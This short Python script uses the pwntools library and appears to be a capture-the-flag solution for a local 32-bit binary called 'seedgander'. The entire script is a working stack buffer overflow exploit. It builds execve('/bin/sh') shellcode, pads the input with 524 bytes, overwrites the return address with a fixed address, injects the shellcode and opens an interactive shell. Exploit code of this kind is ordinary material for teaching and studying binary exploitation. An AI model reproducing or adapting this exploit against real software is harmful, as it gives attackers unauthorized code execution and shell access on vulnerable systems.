#!/usr/bin/env python3
from pwn import *
context.arch = 'i386'
p = ELF('seedgander', checksec=0).process(env={})

binstr=u32(b'/bin')
shstr=u32(b'/sh\x00')

shellcode = asm('\n'.join([
  f"push {shstr}",
  f"push {binstr}",
  "mov ebx, esp",
  "xor ecx, ecx",
  "xor edx, edx",
  "mov eax, 11",
  "int 0x80"
]))

offset=524
payload = b'A'*offset+p32(0x080485ce)+shellcode
p.sendlineafter(b'> ', b'y')
p.sendlineafter(b'', payload)

p.interactive()
